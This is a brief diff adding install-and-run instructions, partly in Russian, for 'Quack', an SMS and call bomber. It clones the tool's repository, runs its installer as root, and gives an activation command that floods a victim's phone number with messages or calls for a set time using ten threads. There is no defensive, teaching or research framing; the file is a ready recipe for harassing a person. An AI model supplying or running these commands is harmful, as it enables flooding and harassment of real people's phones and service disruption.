@@ -1,0 +1,8 @@
+⚠--- SMS Bomber (Quack) ---⚠
+sudo apt update
+git clone https://github.com/entynetproject/quack
+cd quack
+chmod +x install.sh
+sudo ./install.sh
+Активация:
+quack --tool [SMS/CALL] --target +7[Номер телефона жертвы] --time [Время через которое будет остановлена атака] --thread 10
